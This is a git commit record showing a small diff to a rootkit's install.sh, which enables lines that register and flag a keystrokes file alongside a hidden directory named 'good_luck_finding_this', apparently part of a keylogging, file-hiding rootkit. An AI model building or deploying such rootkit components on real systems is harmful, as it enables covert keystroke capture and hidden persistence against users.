a18fcc4a4fc68e2ac8549330a8bdb1026e558dd4
Hooplahaha <josephschirato@gmail.com>
2018-10-21 19:38:05 +1100

    Fixed install.sh

--- rootkit/install.sh
+++ rootkit/install.sh
@@ -15,10 +15,10 @@ sys_num=$(cat /etc/good_luck_finding_this/syscall_number.txt)
 
 ./add.sh syscall_number.txt
 ./add.sh good_luck_finding_this
-# ./add.sh keystrokes.txt
+./add.sh keystrokes.txt
 
 ./setflags.sh syscall_number.txt 01
 ./setflags.sh good_luck_finding_this 00
-# ./setflags.sh keystrokes.txt 01
+./setflags.sh keystrokes.txt 01
 
 
